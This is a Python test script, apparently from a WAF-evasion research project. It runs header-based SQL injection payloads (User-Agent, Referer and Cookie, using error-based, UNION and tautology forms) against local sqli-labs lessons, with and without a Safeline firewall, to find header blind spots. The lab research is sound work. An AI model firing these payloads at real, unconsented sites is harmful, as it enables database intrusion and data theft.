"""
bypass_lab/test_headers.py
===========================
Header-based SQL injection bypass.

sqli-labs Less-18 = User-Agent injection (INSERT into uagents table)
sqli-labs Less-19 = Referer injection
sqli-labs Less-20 = Cookie injection

Safeline inspects GET/POST params for SQL injection but may not
inspect HTTP headers — classic WAF blind spot.

Run:
    python3 -m bypass_lab.test_headers
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
import requests

PLAIN = "http://localhost:8081"
WAF   = "http://localhost:8888"
FOUND = []


def req(host, path, method="POST", params=None, data=None, headers=None):
    h = {"User-Agent": "Mozilla/5.0"}
    if headers:
        h.update(headers)
    try:
        if method == "POST":
            r = requests.post(f"{host}{path}", data=data, headers=h,
                              params=params, timeout=8)
        else:
            r = requests.get(f"{host}{path}", headers=h,
                             params=params, timeout=8)
        time.sleep(0.3)
        return r
    except Exception as e:
        return None


def check_response(r, label, host_tag):
    if r is None:
        print(f"  [{host_tag}] {label}: ERR (no response)")
        return False
    body = r.text
    has_data = any(x in body for x in
                   ["Dumb", "Angelina", "admin", "SEQSQLI_START",
                    "Your Login", "Your Password", "Your UA", "Your IP",
                    "Your Referer"])
    has_err = any(x in body.lower() for x in
                  ["error in your sql", "syntax", "xpath"])
    blocked = r.status_code == 403
    tag = "BLOCK" if blocked else f"HTTP {r.status_code}"
    detail = f"data={has_data} err={has_err}"
    print(f"  [{host_tag}] {tag} | {detail} | {label}")
    if (has_data or has_err) and not blocked:
        FOUND.append((label, host_tag, r.status_code))
        idx = body.find("Your")
        if idx >= 0:
            print(f"    snippet: {body[idx:idx+120].replace(chr(10),' ')}")
    return has_data or has_err


# ── Check which Less headers are available ────────────────────────────
print("=== Cek Less-18, 19, 20 ===")
for i in [18, 19, 20]:
    r = req(PLAIN, f"/Less-{i}/", method="GET")
    if r:
        exists = r.status_code == 200
        print(f"  Less-{i}: HTTP {r.status_code} | exists={exists}")
    else:
        print(f"  Less-{i}: timeout/error")


# ── Less-18: User-Agent injection ─────────────────────────────────────
print("\n=== Less-18: User-Agent Injection ===")
# Less-18 needs POST login first, then reads User-Agent for INSERT
payloads_ua = [
    ("normal",               "Mozilla/5.0"),
    ("basic sqli",           "' OR '1'='1"),
    ("sleep test",           "' OR SLEEP(0)-- -"),
    ("error extractvalue",   "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"),
    ("error updatexml",      "' AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- -"),
    ("union ua",             "' UNION SELECT database(),'x','y'-- -"),
    ("geometry",             "' AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT database())a))-- -"),
]
for label, ua in payloads_ua:
    for host, tag in [(PLAIN, "PLAIN"), (WAF, "WAF")]:
        r = req(host, "/Less-18/",
                method="POST",
                data={"uname": "admin", "passwd": "admin", "submit": "Submit"},
                headers={"User-Agent": ua})
        check_response(r, f"UA: {label}", tag)


# ── Less-19: Referer injection ────────────────────────────────────────
print("\n=== Less-19: Referer Injection ===")
payloads_ref = [
    ("normal",               "http://example.com"),
    ("basic sqli",           "' OR '1'='1"),
    ("sleep test",           "' OR SLEEP(0)-- -"),
    ("error extractvalue",   "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"),
    ("error updatexml",      "' AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- -"),
    ("union referer",        "' UNION SELECT database(),'x','y'-- -"),
]
for label, ref in payloads_ref:
    for host, tag in [(PLAIN, "PLAIN"), (WAF, "WAF")]:
        r = req(host, "/Less-19/",
                method="POST",
                data={"uname": "admin", "passwd": "admin", "submit": "Submit"},
                headers={"Referer": ref})
        check_response(r, f"Ref: {label}", tag)


# ── Less-20: Cookie injection ─────────────────────────────────────────
print("\n=== Less-20: Cookie Injection ===")
payloads_cookie = [
    ("normal",             "uname=admin"),
    ("basic sqli",         "uname=admin' OR '1'='1"),
    ("extractvalue",       "uname=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"),
    ("union cookie",       "uname=-1' UNION SELECT database(),'x','y'-- -"),
]
for label, cookie in payloads_cookie:
    for host, tag in [(PLAIN, "PLAIN"), (WAF, "WAF")]:
        r = req(host, "/Less-20/",
                method="GET",
                headers={"Cookie": cookie})
        check_response(r, f"Cookie: {label}", tag)


# ── Summary ────────────────────────────────────────────────────────────
print("\n" + "=" * 60)
print(f" FOUND on WAF: {len([x for x in FOUND if x[1]=='WAF'])}")
for label, tag, status in FOUND:
    if tag == "WAF":
        print(f"  {label} (HTTP {status})")
